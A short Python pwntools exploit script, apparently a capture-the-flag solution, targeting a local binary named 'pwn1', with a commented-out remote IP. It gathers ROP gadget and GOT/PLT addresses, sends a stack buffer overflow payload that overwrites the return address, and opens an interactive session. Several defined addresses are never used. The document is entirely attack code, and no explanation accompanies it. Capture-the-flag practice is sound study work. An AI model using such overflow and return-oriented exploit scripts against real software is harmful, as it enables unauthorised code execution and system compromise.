from pwn import *
from LibcSearcher import *
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['tmux','splitw','-h']
p=process("./pwn1")
elf = ELF("./pwn1")
#p=remote("152.136.44.97",20001)

main_addr= 0x40072a#elf.symbols["main"]
system_addr=elf.symbols["system"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

pop_rdi_ret = 0x00000000004007e3
pop_rsi_r15_ret = 0x00000000004007e1

p.recvuntil("\n")
payload ="A"*0x2000+p64(0xdeadbeef)+p64(0x40071d)
p.sendline(payload)

p.interactive()
